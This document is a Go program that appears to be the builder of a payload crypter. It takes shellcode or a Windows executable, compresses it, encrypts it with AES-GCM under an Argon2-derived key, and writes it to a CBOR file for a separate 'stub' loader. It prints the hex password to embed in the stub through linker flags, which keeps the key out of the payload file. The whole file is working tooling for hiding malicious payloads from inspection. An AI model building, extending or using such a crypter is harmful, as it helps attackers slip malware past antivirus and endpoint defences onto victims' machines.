package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/fxamacker/cbor/v2"
	"golang.org/x/crypto/argon2"
)

const (
	argonTime    uint32 = 1
	argonMemory  uint32 = 64 * 1024
	argonThreads uint8  = 4
	argonKeyLen  uint32 = 32
	saltSize            = 16
	passwordSize        = 32
)

// password is NOT stored in the CBOR payload
// It is printed to stdout after encryption and must be injected into the stub
// at link time via: -ldflags "-X main.password=<hex>"
type PayloadData struct {
	EncryptedBytes []byte `cbor:"encrypted"`
	Salt           []byte `cbor:"salt"`
	Nonce          []byte `cbor:"nonce"`
	Alg            string `cbor:"alg"`
	Compressed     bool   `cbor:"compressed,omitempty"`
	PayloadType    string `cbor:"payload_type"`
	ArgonParams    struct {
		Time    uint32 `cbor:"time"`
		Memory  uint32 `cbor:"memory"`
		Threads uint8  `cbor:"threads"`
	} `cbor:"argon_params"`
}

func main() {
	typeFlag := flag.String("type", "shellcode", "type of file, you don't need to set this")
	flag.Parse()

	if flag.NArg() < 1 {
		fmt.Printf("[+] run with %s <inputfile>\n", os.Args[0])
		os.Exit(1)
	}

	fname := flag.Arg(0)

	plaintextBytes, err := os.ReadFile(fname)
	if err != nil {
		log.Fatalf("[-] failed to read file: %v", err)
	}

	stubDir := filepath.Join("..", "stub")
	payloadPath := filepath.Join(stubDir, "payload.cbor")

	password := make([]byte, passwordSize)
	if _, err := io.ReadFull(rand.Reader, password); err != nil {
		log.Fatalf("[-] failed to generate random password: %v", err)
	}

	salt := make([]byte, saltSize)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		log.Fatalf("[-] failed to generate random salt: %v", err)
	}

	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)

	alg := "aesgcm"
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("[-] failed to create AES cipher: %v", err)
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("[-] failed to create AES-GCM AEAD: %v", err)
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatalf("[-] failed to generate random nonce: %v", err)
	}

	var dataToEncrypt []byte
	compressed := true

	var b bytes.Buffer
	zw, err := zlib.NewWriterLevel(&b, zlib.BestCompression)
	if err != nil {
		log.Printf("[!]: [-] failed to create zlib writer: %v", err)
		compressed = false
		dataToEncrypt = plaintextBytes
	} else {
		_, err = zw.Write(plaintextBytes)
		if err != nil {
			log.Printf("[!]: [-] failed to compress data: %v", err)
			compressed = false
			dataToEncrypt = plaintextBytes
		} else {
			err = zw.Close()
			if err != nil {
				log.Printf("[!]: [-] failed to finalize compression: %v", err)
				compressed = false
				dataToEncrypt = plaintextBytes
			} else {
				compressedData := b.Bytes()
				if len(compressedData) < len(plaintextBytes) {
					dataToEncrypt = compressedData
					fmt.Printf("[+] compression reduced size from %d to %d bytes (%.2f%%)",
						len(plaintextBytes), len(compressedData),
						float64(len(compressedData))/float64(len(plaintextBytes))*100)
				} else {
					compressed = false
					dataToEncrypt = plaintextBytes
					fmt.Println("[+] compression did not reduce size, using uncompressed data")
				}
			}
		}
	}

	encryptedBytes := aead.Seal(nil, nonce, dataToEncrypt, nil)
	if strings.Contains(fname, ".exe") {
		flag.Set("type", "exe")
	}
	payload := PayloadData{
		EncryptedBytes: encryptedBytes,
		Salt:           salt,
		Nonce:          nonce,
		Alg:            alg,
		Compressed:     compressed,
		PayloadType:    strings.ToLower(*typeFlag),
	}
	payload.ArgonParams.Time = argonTime
	payload.ArgonParams.Memory = argonMemory
	payload.ArgonParams.Threads = uint8(argonThreads)
	encOpts := cbor.EncOptions{
		Sort: cbor.SortBytewiseLexical,
	}

	encMode, err := encOpts.EncMode()
	if err != nil {
		log.Fatalf("[-] failed to create CBOR encoder: %v", err)
	}

	cborData, err := encMode.Marshal(payload)
	if err != nil {
		log.Fatalf("[-] failed to marshal CBOR data: %v", err)
	}

	if err := os.WriteFile(payloadPath, cborData, 0600); err != nil {
		log.Fatalf("[-] failed to write CBOR payload: %v", err)
	}

	hexPassword := hex.EncodeToString(password)
	fmt.Printf("[+] encryption completed successfully!\nCBOR payload saved to:\n- %s\n", payloadPath)
	fmt.Printf("[+] build stub with:\n    go build -ldflags \"-X main.password=%s\" .\n", hexPassword)
}
